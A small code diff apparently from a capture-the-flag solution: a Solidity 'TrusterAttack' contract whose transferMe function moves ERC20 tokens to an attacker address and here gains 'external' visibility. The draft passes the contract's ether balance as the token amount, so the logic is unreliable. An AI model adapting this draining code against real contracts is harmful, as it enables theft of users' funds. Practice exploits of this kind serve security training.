@@ -42,7 +42,7 @@ contract TrusterAttack {
         //token.tranfser(amount,attacker)
         //
     }
-    function transferMe(address tokenAddress, address attackerAddress){
+    function transferMe(address tokenAddress, address attackerAddress) external{
         IERC20(tokenAddress).transfer(attackerAddress, this.balance);
     }
 
